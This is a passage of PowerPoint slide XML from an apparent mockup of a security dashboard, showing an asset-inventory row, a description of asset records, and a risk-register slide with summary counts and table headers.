            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="5577840"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="TextBox 104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="5577840"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Python 3.10 · ML · routing · internal-only</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Rectangle 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5788152"/>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92608" y="5824728"/>
            <a:ext cx="1920240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shipment-api</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="TextBox 107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="5824728"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>service</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="TextBox 108"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="5824728"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>172.20.0.20</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110" name="TextBox 109"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4681728" y="5824728"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MEDIUM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="TextBox 110"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5641848" y="5824728"/>
            <a:ext cx="685800" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="TextBox 111"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419088" y="5824728"/>
            <a:ext cx="5806440" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>REST · JSON · port-8080 · shipments · rate-limited</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Rectangle 112"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6126480"/>
            <a:ext cx="11731752" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051218"/>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65760" y="6217920"/>
            <a:ext cx="11457432" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each asset record stores: hostname, IP list, OS version, installed apps, open ports, patch status, last scan date, criticality rating, tags for CVE matching, source (manual/cloud/scan), and external ID for cross-referencing with cloud provider inventories. Clicking an asset opens its detail page showing all linked CVEs, exploit history, and patch recommendations.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Risk Management</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Structured risk register — likelihood × impact scoring, owner assignment, mitigation tracking</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Risk Management provides the security team with a formal, board-level view of organisational risks that go beyond individual CVEs. While a CVE describes a technical vulnerability, a Risk describes the business consequence of that vulnerability being exploited — or of a broader security gap. Each risk entry has a likelihood score (1–5), an impact score (1–5), and a combined risk score (likelihood × impact, max 25). Risks scoring 15 or above are flagged as critical and appear at the top of the register. Owners receive automated review reminders, and each risk links to its associated CVEs, assets, and open incidents so context is never lost.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2121408"/>
            <a:ext cx="2286000" cy="777240"/>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21408"/>
            <a:ext cx="228600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12848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Total Risks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Org-wide scope</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2121408"/>
            <a:ext cx="2286000" cy="77724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6040" y="2121408"/>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212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Score ≥15</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Immediate action required</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2121408"/>
            <a:ext cx="2286000" cy="777240"/>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2121408"/>
            <a:ext cx="228600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3208" y="2212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>In Progress</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Active mitigation running</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="2121408"/>
            <a:ext cx="2286000" cy="77724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2121408"/>
            <a:ext cx="228600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2212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mitigated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Controls verified active</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738360" y="2121408"/>
            <a:ext cx="2194560" cy="77724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38360" y="2121408"/>
            <a:ext cx="219456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8088" y="2212848"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Max Score</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2395728"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>25</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Log4Shell on live ERP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2999232"/>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35808"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Risk Register — Full Inventory with Scores and Mitigation Plans</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3310128"/>
            <a:ext cx="12070079"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55848"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RISK ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932688" y="3355848"/>
            <a:ext cx="2560320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TITLE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3584448" y="3355848"/>
            <a:ext cx="1097280" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CATEGORY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4773168" y="3355848"/>
            <a:ext cx="731520" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LIKELIHOOD</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="3355848"/>
            <a:ext cx="566928" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IMPACT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="3355848"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SCORE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848856" y="3355848"/>
            <a:ext cx="868680" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STATUS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7808976" y="3355848"/>
            <a:ext cx="713232" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OWNER</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8613648" y="3355848"/>
            <a:ext cx="3657599" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
